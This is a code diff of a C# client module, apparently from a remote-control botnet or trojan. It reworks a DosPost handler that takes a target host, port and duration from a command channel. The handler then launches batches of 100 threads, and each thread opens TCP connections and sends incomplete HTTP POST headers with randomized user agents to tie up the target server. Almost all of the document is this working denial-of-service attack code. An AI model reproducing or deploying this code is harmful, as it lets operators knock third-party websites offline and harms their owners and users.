@@ -1,5 +1,5 @@
 ﻿using Client.MessagePack;
-using Client.Sockets;
+using Client.Connection;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -28,42 +28,43 @@ namespace Client.Handle_Packet
 
         public void DosPost(MsgPack unpack_msgpack)
         {
-            host = new Uri(unpack_msgpack.ForcePathObject("Host").AsString).DnsSafeHost;
-            port = Convert.ToInt32(unpack_msgpack.ForcePathObject("port").AsString);
-            timeout = Convert.ToInt32(unpack_msgpack.ForcePathObject("timeout").AsString) * 60;
-            List<Socket> SocketList = new List<Socket>();
-            TimeSpan timespan = TimeSpan.FromSeconds(timeout);
-            Stopwatch stopwatch = new Stopwatch();
-            stopwatch.Start();
-
-            Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
-            while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && ClientSocket.IsConnected)
+            try
             {
-                new Thread(() =>
+                host = new Uri(unpack_msgpack.ForcePathObject("Host").AsString).DnsSafeHost;
+                port = Convert.ToInt32(unpack_msgpack.ForcePathObject("port").AsString);
+                timeout = Convert.ToInt32(unpack_msgpack.ForcePathObject("timeout").AsString) * 60;
+                TimeSpan timespan = TimeSpan.FromSeconds(timeout);
+                Stopwatch stopwatch = new Stopwatch();
+                stopwatch.Start();
+
+
+                Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
+                while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && ClientSocket.IsConnected)
                 {
-                    try
+                    for (int i = 0; i < 100; i++)
                     {
-                        Socket tcp = new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
-                        tcp.Connect(host.ToString(), port);
-                        SocketList.Add(tcp);
-                        string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
-                        byte[] buffer = Encoding.UTF8.GetBytes(post);
-                        tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                        new Thread(() =>
+                        {
+                            try
+                            {
+                                Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                                tcp.Connect(host.ToString(), port);
+                                string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
+                                byte[] buffer = Encoding.UTF8.GetBytes(post);
+                                tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                                Thread.Sleep(4000);
+                                tcp.Dispose();
+                            }
+                            catch
+                            {
+                                //Console.WriteLine("Website may be down!");
+                            }
+                        }).Start();
                     }
-                    catch
-                    {
-                        //Console.WriteLine("Website may be down!");
-                    }
-                }).Start();
-                Thread.Sleep(1);
+                    Thread.Sleep(5000);
+                }
             }
-
-            Thread.Sleep(1000);
-            foreach (Socket tcp in SocketList.ToList())
-            {
-                    tcp?.Dispose();
-            }
-
+            catch { return; }
         }
     }
 }
